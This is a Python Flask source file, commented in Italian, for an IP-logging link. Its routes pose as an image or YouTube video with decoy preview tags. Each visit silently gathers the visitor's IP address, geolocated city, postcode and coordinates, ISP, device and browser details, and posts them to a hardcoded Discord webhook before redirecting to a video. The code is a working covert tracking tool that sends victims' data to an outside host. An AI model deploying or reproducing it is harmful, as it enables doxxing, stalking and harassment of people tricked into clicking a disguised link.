from flask import Flask, request, redirect
from datetime import datetime
import requests
import os
import re
import time

app = Flask(__name__)

# TUO WEBHOOK PERSONALE
WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"

# Immagine da mostrare
IMAGE_URL = "https://media.discordapp.net/attachments/1527831756005183559/1528024870393483475/Nuovo_progetto_-_2026-07-18T150514.387.png?ex=6a5ccb8e&is=6a5b7a0e&hm=709fc7a05f8b331d71610beac5dd3757722bb147a2b4a6f7f36d8b2060094563&=&format=webp&quality=lossless&width=17&height=17"

def get_real_ip(request):
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr

def get_ip_info(ip):
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "N/D"),
                    "countryCode": data.get("countryCode", "N/D"),
                    "region": data.get("regionName", "N/D"),
                    "city": data.get("city", "N/D"),
                    "zip": data.get("zip", "N/D"),
                    "lat": data.get("lat", "N/D"),
                    "lon": data.get("lon", "N/D"),
                    "timezone": data.get("timezone", "N/D"),
                    "isp": data.get("isp", "N/D"),
                    "org": data.get("org", "N/D"),
                    "as": data.get("as", "N/D"),
                    "asname": data.get("asname", "N/D"),
                    "reverse": data.get("reverse", "N/D"),
                    "mobile": data.get("mobile", False),
                    "proxy": data.get("proxy", False),
                    "hosting": data.get("hosting", False)
                }
    except Exception as e:
        print(f"Errore API: {e}")
    return None

def get_device_info(request):
    ua = request.headers.get('User-Agent', '')
    
    info = {
        "user_agent": ua,
        "browser": "Sconosciuto",
        "browser_version": "?",
        "os": "Sconosciuto",
        "os_version": "?",
        "device": "Desktop",
        "is_mobile": False,
        "is_tablet": False,
        "is_bot": False
    }
    
    # Detect Bot
    bots = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java']
    if any(bot in ua.lower() for bot in bots):
        info["is_bot"] = True
    
    # Detect OS
    if 'Windows NT 10' in ua:
        info["os"] = "Windows 10/11"
    elif 'Windows NT 6.3' in ua:
        info["os"] = "Windows 8.1"
    elif 'Windows NT 6.1' in ua:
        info["os"] = "Windows 7"
    elif 'Mac OS X' in ua:
        info["os"] = "macOS"
        version = re.search(r'Mac OS X (\d+[._]\d+)', ua)
        if version:
            info["os_version"] = version.group(1).replace('_', '.')
    elif 'Linux' in ua and 'Android' not in ua:
        info["os"] = "Linux"
    elif 'Android' in ua:
        info["os"] = "Android"
        info["is_mobile"] = True
        info["device"] = "Mobile"
        version = re.search(r'Android (\d+\.\d+)', ua)
        if version:
            info["os_version"] = version.group(1)
    elif 'iPhone' in ua:
        info["os"] = "iOS (iPhone)"
        info["is_mobile"] = True
        info["device"] = "Mobile"
    elif 'iPad' in ua:
        info["os"] = "iOS (iPad)"
        info["is_tablet"] = True
        info["device"] = "Tablet"
    
    # Detect Browser
    if 'Edg/' in ua:
        info["browser"] = "Edge"
        version = re.search(r'Edg/(\d+)', ua)
        if version: info["browser_version"] = version.group(1)
    elif 'Firefox/' in ua:
        info["browser"] = "Firefox"
        version = re.search(r'Firefox/(\d+)', ua)
        if version: info["browser_version"] = version.group(1)
    elif 'Chrome/' in ua and 'Safari/' in ua:
        info["browser"] = "Chrome"
        version = re.search(r'Chrome/(\d+)', ua)
        if version: info["browser_version"] = version.group(1)
    elif 'Safari/' in ua and 'Chrome' not in ua:
        info["browser"] = "Safari"
        version = re.search(r'Version/(\d+)', ua)
        if version: info["browser_version"] = version.group(1)
    elif 'Opera' in ua or 'OPR/' in ua:
        info["browser"] = "Opera"
    
    return info

def get_request_info(request):
    return {
        "method": request.method,
        "url": str(request.url),
        "path": request.path,
        "host": request.host,
        "referrer": request.headers.get('Referer', 'N/D'),
        "accept_language": request.headers.get('Accept-Language', 'N/D'),
        "accept_encoding": request.headers.get('Accept-Encoding', 'N/D'),
        "connection": request.headers.get('Connection', 'N/D'),
        "dnt": request.headers.get('DNT', 'N/D'),
        "cookies": len(request.cookies),
        "content_type": request.headers.get('Content-Type', 'N/D')
    }

def send_to_discord(ip, ip_info, device_info, request_info, route_name):
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    
    # Embed 1: IP e Posizione
    embed1 = {
        "title": "🌐 Informazioni IP e Posizione",
        "color": 5814783,
        "fields": [
            {"name": "🔢 IP", "value": f"`{ip}`", "inline": False}
        ]
    }
    
    if ip_info:
        embed1["fields"].extend([
            {"name": "🌍 Paese", "value": f"{ip_info.get('country', 'N/D')} ({ip_info.get('countryCode', 'N/D')})", "inline": True},
            {"name": "🏙️ Città", "value": f"{ip_info.get('city', 'N/D')}, {ip_info.get('region', 'N/D')}", "inline": True},
            {"name": "📮 CAP", "value": str(ip_info.get('zip', 'N/D')), "inline": True},
            {"name": "📍 Coordinate", "value": f"Lat: {ip_info.get('lat', 'N/D')}\nLon: {ip_info.get('lon', 'N/D')}", "inline": True},
            {"name": "🕐 Timezone", "value": ip_info.get('timezone', 'N/D'), "inline": True},
            {"name": "📱 Mobile", "value": "✅ Sì" if ip_info.get('mobile') else "❌ No", "inline": True},
            {"name": "🔒 Proxy/VPN", "value": "⚠️ Sì" if ip_info.get('proxy') else "❌ No", "inline": True},
            {"name": "🏢 Hosting", "value": "⚠️ Sì" if ip_info.get('hosting') else "❌ No", "inline": True}
        ])
    
    # Embed 2: Connessione
    embed2 = {
        "title": "🔌 Informazioni Connessione",
        "color": 3447003,
        "fields": []
    }
    
    if ip_info:
        embed2["fields"].extend([
            {"name": "📡 ISP", "value": ip_info.get('isp', 'N/D'), "inline": True},
            {"name": "🏢 Organizzazione", "value": ip_info.get('org', 'N/D'), "inline": True},
            {"name": "🔢 AS", "value": f"{ip_info.get('as', 'N/D')}\n{ip_info.get('asname', 'N/D')}", "inline": True},
            {"name": "🔄 Reverse DNS", "value": ip_info.get('reverse', 'N/D'), "inline": False}
        ])
    
    # Embed 3: Dispositivo
    embed3 = {
        "title": "💻 Informazioni Dispositivo",
        "color": 16776960,
        "fields": [
            {"name": "🖥️ Sistema Operativo", "value": f"{device_info.get('os', 'N/D')} {device_info.get('os_version', '')}", "inline": True},
            {"name": "🌐 Browser", "value": f"{device_info.get('browser', 'N/D')} v{device_info.get('browser_version', '')}", "inline": True},
            {"name": "📱 Tipo Dispositivo", "value": device_info.get('device', 'N/D'), "inline": True},
            {"name": "🤖 Bot", "value": "⚠️ Sì" if device_info.get('is_bot') else "❌ No", "inline": True},
            {"name": "🔤 Lingue", "value": request_info.get('accept_language', 'N/D')[:100], "inline": False},
            {"name": "🆔 User-Agent", "value": f"```{device_info.get('user_agent', 'N/D')[:200]}```", "inline": False}
        ]
    }
    
    # Embed 4: Richiesta HTTP
    embed4 = {
        "title": "📡 Dettagli Richiesta",
        "color": 10038562,
        "fields": [
            {"name": "🔗 Referrer", "value": request_info.get('referrer', 'N/D')[:100], "inline": False},
            {"name": "🛤️ Route", "value": route_name, "inline": True},
            {"name": "📋 Metodo", "value": request_info.get('method', 'N/D'), "inline": True},
            {"name": "🚫 DNT", "value": request_info.get('dnt', 'N/D'), "inline": True},
            {"name": "🍪 Cookies", "value": str(request_info.get('cookies', 0)), "inline": True}
        ]
    }
    
    data = {
        "content": f"🔔 **Nuovo IP Loggato!** | 📅 `{date}` | 🛤️ `{route_name}`",
        "embeds": [embed1, embed2, embed3, embed4]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print(f"✅ Inviato: {ip}")
        elif response.status_code == 429:
            print(f"⚠️ Rate limit, riprovo...")
            time.sleep(2)
            response = requests.post(WEBHOOK_URL, json=data)
        else:
            print(f"❌ Errore: {response.status_code}")
    except Exception as e:
        print(f"❌ Eccezione: {e}")

@app.route("/")
def index():
    ip = get_real_ip(request)
    ip_info = get_ip_info(ip)
    device_info = get_device_info(request)
    request_info = get_request_info(request)
    send_to_discord(ip, ip_info, device_info, request_info, "Home")
    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")

@app.route("/img")
@app.route("/image")
@app.route("/photo")
@app.route("/pic")
def image_tracker():
    ip = get_real_ip(request)
    ip_info = get_ip_info(ip)
    device_info = get_device_info(request)
    request_info = get_request_info(request)
    send_to_discord(ip, ip_info, device_info, request_info, "Immagine")
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="Guarda questa immagine!">
        <meta property="og:description" content="Clicca per vederla meglio">
        <meta property="og:image" content="{IMAGE_URL}">
        <meta property="og:type" content="website">
        <meta name="twitter:card" content="summary_large_image">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ background: #1a1a1a; display: flex; justify-content: center; align-items: center; min-height: 100vh; cursor: pointer; font-family: Arial, sans-serif; }}
            .container {{ text-align: center; padding: 20px; }}
            .container img {{ max-width: 90vw; max-height: 80vh; border-radius: 10px; box-shadow: 0 0 30px rgba(255,255,255,0.1); transition: all 0.3s ease; }}
            .container img:hover {{ transform: scale(1.02); box-shadow: 0 0 40px rgba(255,255,255,0.2); }}
            .container p {{ color: #888; margin-top: 15px; font-size: 14px; }}
        </style>
    </head>
    <body onclick="redirectToVideo()">
        <div class="container">
            <img src="{IMAGE_URL}" alt="Clicca qui" id="mainImage">
            <p>Clicca sull'immagine per continuare...</p>
        </div>
        <script>
            function redirectToVideo() {{ window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share"; }}
            document.getElementById('mainImage').addEventListener('click', function(e) {{ redirectToVideo(); }});
        </script>
    </body>
    </html>
    """

@app.route("/video")
@app.route("/shorts")
@app.route("/watch")
@app.route("/yt")
def video_preview():
    ip = get_real_ip(request)
    ip_info = get_ip_info(ip)
    device_info = get_device_info(request)
    request_info = get_request_info(request)
    send_to_discord(ip, ip_info, device_info, request_info, "Video")
    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
